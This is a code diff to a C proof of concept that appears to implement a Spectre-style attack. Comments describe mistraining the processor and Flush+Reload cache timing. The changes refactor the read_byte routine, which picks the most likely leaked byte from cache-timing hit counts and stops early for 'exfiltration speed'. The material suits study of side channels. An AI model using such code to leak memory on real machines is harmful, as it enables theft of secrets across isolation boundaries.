@@ -70,6 +70,36 @@ bool is_base64(char chr) {
     return isalnum(chr) || chr == '+' || chr == '/';
 }
 
+size_t get_max_index(size_t size, int array[size]) {
+    int max = INT_MIN;
+    size_t max_index = 0;
+    for (size_t i = 0; i < size; i++) {
+        if (array[i] >= max) {
+            max = array[i];
+            max_index = i;
+        }
+    }
+    return max_index;
+}
+
+size_t get_second_max_index(size_t size, int array[size]) {
+    int maxes[] = {INT_MIN, INT_MIN};
+    size_t max_indices [] = {0, 0}; 
+    for (size_t i = 0; i < size; i++) {
+        if (array[i] >= maxes[0]) {
+            maxes[1] = maxes[0];
+            max_indices[1] = max_indices[0];
+            maxes[0] = array[i];
+            max_indices[0] = i;
+        } else if (array[i] <= maxes[0] && array[i] >= maxes[1]) {
+            maxes[1] = array[i];
+            max_indices[1] = i;
+        }
+    }
+
+    return max_indices[1];
+}
+
 // Phase 1 - Misstrain processor by feeding processes. (e.g. Manipulating the cache state to remove data that the processor will need to determine the actual control flow.)
 //         - Prepare for side-channel attack. In our case init arrays to hold the timing attack results(e.g. perform flush or evict part of a Flush+Reload or Evict-Reload attack.)
 
@@ -128,7 +158,7 @@ ull time_l3_access(size_t idx) {
 
 char read_byte(size_t target_idx)
 {
-    int j, k;
+    size_t max, second_max; 
     
     int results[256] = {0};
 
@@ -152,26 +182,17 @@ char read_byte(size_t target_idx)
             }
         }
 
-        j = k = -1;
-        for (size_t i = 0; i < 256; i++)
-        {
-            if (j < 0 || results[i] >= results[j])
-            {
-                k = j;
-                j = i;
-            }
-            else if (k < 0 || results[i] >= results[k])
-            {
-                k = i;
-            }
-        }
+        max = get_max_index(256, results);
+        second_max = get_second_max_index(256, results);
+
         // We need to have an early termination condition, both for exfiltration speed
-        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
+        if (results[max] >= (2 * results[second_max] + 5) 
+            || (results[max] == 2 && !results[second_max]))
         {
             break; 
         }
     }
-    return (char) j;
+    return (char) max;
 }
 
 int main(int argc, char *argv[argc])
